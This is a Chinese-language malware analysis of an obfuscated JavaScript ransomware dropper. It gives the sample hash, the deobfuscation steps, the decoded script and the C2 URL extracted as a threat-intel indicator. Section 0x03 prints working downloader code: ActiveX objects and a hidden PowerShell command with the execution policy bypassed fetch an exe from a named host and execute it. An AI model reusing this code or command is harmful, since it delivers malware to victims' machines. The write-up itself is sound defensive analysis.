---
title: 脚本病毒RANSOMWARE分析报告
---


标签（空格分隔）： script_virus

---

### 0x01 样本情况
```
32469.js:
  - md5:427a1df2fa83aee62621821f7f35a06e
  - 样本下载地址：https://www.52pojie.cn/thread-632863-1-1.html
```

### 0x02 查看JS脚本
 - 显然是经过混淆的js脚本

![](https://i.screenshot.net/04pl9up)

 -  反混淆处理

[反混淆工具处理这段混淆代码](https://beautifier.io/)

![](https://i.screenshot.net/32zy1f2)

### 0x03 打印出恶意脚本
```
var EwLaTPVSfyHlreW = ('zqOVNfTKRAdfzqOVNfTKRAmzqOVNfTKRAgzqOVNfTKRArzqOVNfTKRAbz.....';
var MLzyURjFNYJQIxbmCDc = "g" + "et" + "Yea" + "r";
var uHkAOUtmzaViQTX = EwLaTPVSfyHlreW;
var vVzZhMxdJEYAONFQT = "2" + "0" + "17";
var CNybIQMgcFodZJHhw = 'dzqOVNfTKRAfzqOVNfTKRAmgrzqOVNfTKRAbzqOVNfTKRAxzqOVNfTKRARzqOVNfTKRAe.......';

if (new Date()[MLzyURjFNYJQIxbmCDc]() == new Array(vVzZhMxdJEYAONFQT)[0]) {
    var wEdOxiLVeHWouvrT = eval(uHkAOUtmzaViQTX);
}
var uILsnJawlMGyopRSN = 'zqOVNfTKRAdzqOVNfTKRAfzqOVNfTKRAmzqOVNfTKRAgzqOVNfTKRArzqOVNfTKRAbzqOVNfTKRAxR.......';
for (var WPZSvTYRVjXuQbNgtyK = 0; WPZSvTYRVjXuQbNgtyK < nIKQOjEcmAWVqZvUtT.length; WPZSvTYRVjXuQbNgtyK++) {
    var rvFBEDAKjqoLehnt = gYOPwAWSmZxeQToy(nIKQOjEcmAWVqZvUtT, WPZSvTYRVjXuQbNgtyK) + 46200 - 6600 * pmrzoakvVYNwnKP / 382800 - 46200;
    if ((rvFBEDAKjqoLehnt != 393498 * pmrzoakvVYNwnKP / 543402) && 
        (rvFBEDAKjqoLehnt != 332544 * pmrzoakvVYNwnKP / 301368) && 
        (CzPLpvSryaAiXZGe(dKAZnkglWzVuJBUro) == true) && 
        (CzPLpvSryaAiXZGe(pmrzoakvVYNwnKP) == false)) {
            QByCYPoXvHVTnhztNm += gCFshcYAGDROUTQBt(rvFBEDAKjqoLehnt);
        
    }
}
SqUXVAryZsoERdNjznB = document.write(QByCYPoXvHVTnhztNm);
```
![](https://i.screenshot.net/ekv2ds4)

```
解码格式化：
eval(unescape("var sh = new ActiveXObject("shell.application ");
try { var HTTP = new ActiveXObject("MSXML2.XMLHTTP ");
var Stream = new ActiveXObject("ADODB.Stream ");
var wsh = new ActiveXObject("wscript.shell ");
var path = wsh.SpecialFolders("Templates ")+"\\"+((Math.random()*999999)+9999|0)+".exe ";
HTTP.Open("GET ", "http: //foolerpolwer.info/admin.php?f=3", false); HTTP.Send(); if (HTTP.Status == 200) {
Stream.Open(); Stream.Type = 1; Stream.Write(HTTP.ResponseBody); Stream.Position = 0; Stream.SaveToFile(path, 2); Stream.Close(); sh.ShellExecute(path, "", "", "open", 1);
}
} catch(e) {
    //运行恶意exe
	sh.ShellExecute("cmd.exe", "/c powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://foolerpolwer.info/admin.php?f=3', '%appdata%rnd.exe'); start-process '%appdata%rnd.exe'", "", "open", 0);
}
")); "
```

### 0x04 提取特征
```
URL：http://foolerpolwer.info/admin.php?f=3
```
查看威胁情报,积分查IP，添加特征库
![](https://i.screenshot.net/o8nz9s6)
![](https://i.screenshot.net/xmv4rsy)
### 0x05总结
> 脚本病毒的特点是灵活，类似js脚本可以在Android、iOS、PC上跑，脚本病毒通常采用混淆保护自己，其次会下载恶意的.exe/.apk/.jar/.ipa(越狱)等文件，并将其运行。
另外感谢 直系学弟/学长帮忙，坑爹的玩意，只能在IE浏览器Debug,因为有ActiveXObject，微软特有。


 